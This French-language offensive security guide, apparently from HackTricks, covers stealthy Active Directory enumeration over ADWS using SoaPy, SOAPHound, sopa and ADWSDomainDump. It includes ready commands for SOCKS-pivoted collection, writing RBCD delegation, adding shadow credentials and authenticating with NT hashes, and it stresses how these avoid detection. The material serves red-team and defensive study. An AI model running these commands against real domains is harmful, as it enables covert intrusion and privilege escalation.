# Énumération d’Active Directory Web Services (ADWS) et collecte furtive

{{#include ../../banners/hacktricks-training.md}}

## Qu’est-ce qu’ADWS ?

Active Directory Web Services (ADWS) est **activé par défaut sur chaque contrôleur de domaine depuis Windows Server 2008 R2** et écoute sur le port TCP **9389**. Malgré son nom, **aucun trafic HTTP n’est impliqué**. À la place, le service expose des données de type LDAP au moyen d’une pile de protocoles propriétaires de framing .NET :<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Comme le trafic est encapsulé dans ces trames SOAP binaires et transite par un port inhabituel, **l’énumération via ADWS a beaucoup moins de chances d’être inspectée, filtrée ou détectée par signature que le trafic LDAP classique sur les ports 389 et 636**. Pour les opérateurs, cela signifie :<sup>[[1]](#references)[[7]](#references)</sup>

* Une recon plus furtive : les équipes Blue Team se concentrent souvent sur les requêtes LDAP.
* La possibilité de collecter des données depuis des **hôtes non Windows (Linux, macOS)** en tunnellisant le port 9389/TCP via un proxy SOCKS.
* Les mêmes données que celles obtenues via LDAP (utilisateurs, groupes, ACL, schéma, etc.), ainsi que la possibilité d’effectuer des **écritures** (par exemple sur `msDs-AllowedToActOnBehalfOfOtherIdentity` pour **RBCD**).

Les interactions ADWS s’appuient sur WS-Enumeration : chaque requête commence par un message `Enumerate` qui définit le filtre LDAP et les attributs, et renvoie un GUID `EnumerationContext`, puis un ou plusieurs messages `Pull` qui transmettent les résultats par lots, dans la limite définie par le serveur.<sup>[[7]](#references)</sup> Les contextes expirent après environ 30 minutes ; les outils doivent donc soit paginer les résultats, soit diviser les filtres (requêtes par préfixe pour chaque CN) pour éviter de perdre l’état de la requête.<sup>[[8]](#references)</sup> Lors de la demande de descripteurs de sécurité, spécifiez le contrôle `LDAP_SERVER_SD_FLAGS_OID` pour omettre les SACL ; sinon, ADWS omet tout simplement l’attribut `nTSecurityDescriptor` de sa réponse SOAP.

> REMARQUE : ADWS est également utilisé par de nombreux outils RSAT avec interface graphique ou PowerShell ; le trafic peut donc se confondre avec une activité d’administration légitime.

## SoaPy – Client Python natif

[SoaPy](https://github.com/logangoins/soapy) est une **réimplémentation complète de la pile de protocoles ADWS en Python pur**. Il construit les trames NBFX/NBFSE/NNS/NMF octet par octet, permettant la collecte depuis des systèmes de type Unix sans recourir au runtime .NET.<sup>[[1]](#references)[[2]](#references)</sup>

### Fonctionnalités principales

* Prend en charge le **passage par un proxy SOCKS** (utile depuis des implants C2).
* Filtres de recherche précis, identiques à ceux de LDAP, par exemple `-q '(objectClass=user)'`.
* Opérations d’**écriture** ciblées pour RBCD, les SPN, les indicateurs de compte et les informations d’identification de clés.<sup>[[2]](#references)</sup>
* La sortie de SOAPy peut être analysée par **BOFHound** et importée dans BloodHound.<sup>[[2]](#references)[[3]](#references)</sup>
* L’option `--parse` permet de rendre les horodatages et `userAccountControl` plus lisibles lorsqu’une lecture humaine est nécessaire.<sup>[[2]](#references)</sup>

### Options de collecte ciblée et opérations d’écriture

SoaPy propose des options soigneusement sélectionnées qui reproduisent les tâches de chasse LDAP les plus courantes via ADWS : `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, ainsi que les options brutes `--query` / `--filter` pour les collectes personnalisées. Elles peuvent être combinées à des opérations d’écriture telles que `--rbcd <source>` (définit `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (préparation de SPN pour un Kerberoasting ciblé) et `--asrep` (active `DONT_REQ_PREAUTH` dans `userAccountControl`).<sup>[[2]](#references)</sup>

Exemple de recherche ciblée de SPN qui ne renvoie que `samAccountName` et `servicePrincipalName` :

```bash
SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Utilisez le même hôte/les mêmes identifiants pour weaponiser immédiatement les résultats : dumpez les objets déjà configurés pour RBCD avec `--rbcds`, puis exécutez `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'` pour préparer une chaîne de Resource-Based Constrained Delegation (voir [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) pour connaître toutes les étapes d’abus).<sup>[[2]](#references)</sup>

### Installation (poste opérateur)

Installez la version actuelle de la CLI SOAPy depuis son dépôt amont ; le nom de l’exécutable est sensible à la casse sur les systèmes de type Unix.<sup>[[2]](#references)[[9]](#references)</sup>

```bash
pipx install git+https://github.com/logangoins/SOAPy
```

### Collecte avec ticket uniquement via un pivot SOCKS

Si un foothold fournit un ticket Kerberos, mais aucun mot de passe en clair, convertissez un ticket `.kirbi` en `ccache` comme décrit dans [Pass the Ticket](pass-the-ticket.md), puis configurez SOAPy pour utiliser ce cache. Un ticket pour le service LDAP du DC peut être utilisé dans le workflow SOAPy ADWS documenté ; faites transiter le trafic ADWS et Kerberos par le pivot.<sup>[[9]](#references)</sup>

```bash
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
```

### Shadow credentials via ADWS

Si le principal actuel peut écrire dans `msDS-KeyCredentialLink` d’un objet cible, SOAPy peut ajouter une key credential via ADWS et exporter le PFX correspondant. Notez le DeviceID renvoyé pour pouvoir supprimer précisément cette entrée au lieu d’effacer l’attribut entier. Utilisez le PFX pour PKINIT, comme expliqué dans [Shadow Credentials](acl-persistence-abuse/shadow-credentials.md).<sup>[[10]](#references)</sup>

```bash
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds add --shadow-target targetuser
# After use, remove only the DeviceID returned by the add action:
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
```

## ADWSDomainDump – LDAPDomainDump via ADWS (Linux/Windows)

* Fork de `ldapdomaindump` qui remplace les requêtes LDAP par des appels ADWS sur TCP/9389 afin de réduire les détections de signatures LDAP.
* Effectue une vérification initiale de l’accessibilité du port 9389, sauf si `--force` est passé (ignore la sonde si les scans de ports sont bruyants ou filtrés).
* Testé contre Microsoft Defender for Endpoint et CrowdStrike Falcon, avec un bypass réussi indiqué dans le README.<sup>[[4]](#references)</sup>

### Installation

```bash
pipx install .
```

### Utilisation

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

La sortie type affiche la vérification de l’accessibilité du port 9389, la liaison ADWS et le début/la fin du dump :

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Un client pratique pour ADWS en Golang

Comme soapy, [sopa](https://github.com/Macmod/sopa) implémente la pile de protocoles ADWS (MS-NNS + MC-NMF + SOAP) en Golang et expose des options en ligne de commande pour effectuer des appels ADWS tels que :<sup>[[5]](#references)</sup>

* **Recherche et récupération d’objets** - `query` / `get`
* **Cycle de vie des objets** - `create [user|computer|group|ou|container|custom]` et `delete`
* **Modification des attributs** - `attr [add|replace|delete]`
* **Gestion des comptes** - `set-password` / `change-password`
* et d’autres, comme `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

### Points clés du mappage des protocoles

* Les recherches de type LDAP sont effectuées via **WS-Enumeration** (`Enumerate` + `Pull`), avec projection d’attributs, contrôle de la portée (Base/OneLevel/Subtree) et pagination.
* La récupération d’un objet unique utilise **WS-Transfer** `Get` ; les modifications d’attributs utilisent `Put` ; les suppressions utilisent `Delete`.
* La création d’objets intégrée utilise **WS-Transfer ResourceFactory** ; les objets personnalisés utilisent un **IMDA AddRequest** basé sur des modèles YAML.
* Les opérations sur les mots de passe sont des actions **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Découverte de métadonnées sans authentification (mex)

ADWS expose WS-MetadataExchange sans identifiants, ce qui permet de vérifier rapidement l’exposition avant de s’authentifier :<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Notes sur la découverte DNS/DC et le ciblage Kerberos

Sopa peut résoudre les DC via SRV si `--dc` est omis et que `--domain` est fourni. Il interroge dans cet ordre et utilise la cible de priorité la plus élevée :<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Sur le plan opérationnel, privilégiez un résolveur contrôlé par un DC pour éviter les échecs dans les environnements segmentés :

* Utilisez `--dns <DC-IP>` pour que **toutes** les recherches SRV/PTR/directes passent par le DNS du DC.
* Utilisez `--dns-tcp` lorsque UDP est bloqué ou que les réponses SRV sont volumineuses.
* Si `--dc` est une adresse IP, sopa effectue toujours une recherche **PTR inversée** : le filtre d’adresse `wsa:To` d’ADWS exige un FQDN, même sans Kerberos. Fournissez directement le FQDN d’un DC si la zone inverse est manquante.<sup>[[5]](#references)</sup>

Exemple (IP + Kerberos, DNS forcé via le DC) :

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Options de matériel d’authentification

Outre les mots de passe en clair, sopa prend en charge les **hashes NT**, les **clés AES Kerberos**, les **ccache** et les **certificats PKINIT** (PFX ou PEM) pour l’authentification ADWS. Kerberos est implicite lors de l’utilisation de `--aes-key`, de `-c` (ccache) ou des options basées sur des certificats.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Création d’objets personnalisés via des modèles

Pour les classes d’objets arbitraires, la commande `create custom` utilise un modèle YAML qui correspond à une requête IMDA `AddRequest` :<sup>[[5]](#references)</sup>

* `parentDN` et `rdn` définissent le conteneur et le DN relatif.
* `attributes[].name` accepte `cn` ou `addata:cn` avec espace de noms.
* `attributes[].type` accepte `string|int|bool|base64|hex` ou un `xsd:*` explicite.
* **N’incluez pas** `ad:relativeDistinguishedName` ni `ad:container-hierarchy-parent` ; sopa les ajoute automatiquement.
* Les valeurs `hex` sont converties en `xsd:base64Binary` ; utilisez `value: ""` pour définir des chaînes vides.

## SOAPHound – Collecte ADWS à grand volume (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) est un collecteur .NET qui effectue toutes les interactions LDAP via ADWS et génère du JSON compatible avec BloodHound v4. Il crée une fois un cache complet de `objectSid`, `objectGUID`, `distinguishedName` et `objectClass` (`--buildcache`), puis le réutilise pour les passes à grand volume `--bhdump`, `--certdump` (ADCS) ou `--dnsdump` (DNS intégré à AD), de sorte que seuls environ 35 attributs critiques quittent le DC. AutoSplit (`--autosplit --threshold <N>`) répartit automatiquement les requêtes selon le préfixe CN afin de respecter le délai d’expiration de 30 minutes d’EnumerationContext dans les grandes forêts.<sup>[[8]](#references)</sup>

Flux de travail courant sur une VM opérateur jointe au domaine :

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Les slots JSON exportés s’intègrent directement aux workflows SharpHound/BloodHound — consultez la [méthodologie BloodHound](bloodhound.md) pour des idées de représentation graphique en aval. AutoSplit rend SOAPHound résistant sur les forêts comptant plusieurs millions d’objets, tout en réduisant le nombre de requêtes par rapport aux snapshots de type ADExplorer.

## Workflow de collecte AD furtive

Le workflow suivant montre comment énumérer les **objets de domaine et ADCS** via ADWS, les convertir au format JSON de BloodHound et rechercher des chemins d’attaque basés sur des certificats — le tout depuis Linux :

1. **Tunnellisez 9389/TCP** depuis le réseau cible jusqu’à votre machine (par exemple via Chisel, Meterpreter, le port forwarding dynamique SSH, etc.). Faites passer le client TCP brut par SOCKS avec `proxychains4 SOAPy ...` (configurez l’adresse SOCKS5 dans `proxychains4.conf`) ; `HTTPS_PROXY` ne relaie pas ce protocole non HTTP.<sup>[[9]](#references)</sup>

2. **Collectez l’objet du domaine racine :**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Collecter les objets liés à ADCS depuis le NC Configuration :**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Convertir en BloodHound :**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Téléversez le ZIP** dans l’interface graphique de BloodHound et exécutez des requêtes cypher telles que `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` pour révéler les chemins d’escalade de privilèges liés aux certificats (ESC1, ESC8, etc.).

### Écriture de `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

Avec un accès en écriture à l’objet ordinateur cible, utilisez l’action RBCD de SOAPy plutôt qu’une chaîne brute de descripteur de sécurité. Ici, `WEBSRV01$` est la source contrôlée et `FILE01$` est la cible dont l’attribut est modifié.<sup>[[2]](#references)</sup>

```bash
SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
```

Continuez la chaîne Kerberos S4U dans [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md).

## Résumé des outils

| Objectif | Outil | Notes |
|---------|------|-------|
| Énumération ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lecture/écriture |
| Dump ADWS à grand volume | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache d’abord, modes BH/ADCS/DNS |
| Import dans BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Convertit les journaux SoaPy/ldapsearch |
| Compromission de certificats | [Certipy](https://github.com/ly4k/Certipy) | Peut être relayé via le même SOCKS |
| Énumération ADWS et modification d’objets | [sopa](https://github.com/Macmod/sopa) | Client générique pour interagir avec les endpoints ADWS connus ; permet l’énumération, la création d’objets, la modification d’attributs et le changement de mots de passe |



## References

- [1] [SpecterOps – Pensez à utiliser SOAP(y) : guide opérateur pour une collecte AD discrète via ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy sur GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound sur GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump sur GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa sur GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – Spécifications MC-NBFX, MC-NBFSE, MS-NNS et MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Énumération discrète d’environnements Active Directory via ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Outil SOAPHound pour collecter des données Active Directory via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
- [9] [Wiki SOAPy – Reconnaissance](https://github.com/logangoins/SOAPy/wiki/Recon)
- [10] [Wiki SOAPy – Post-exploitation](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
{{#include ../../banners/hacktricks-training.md}}
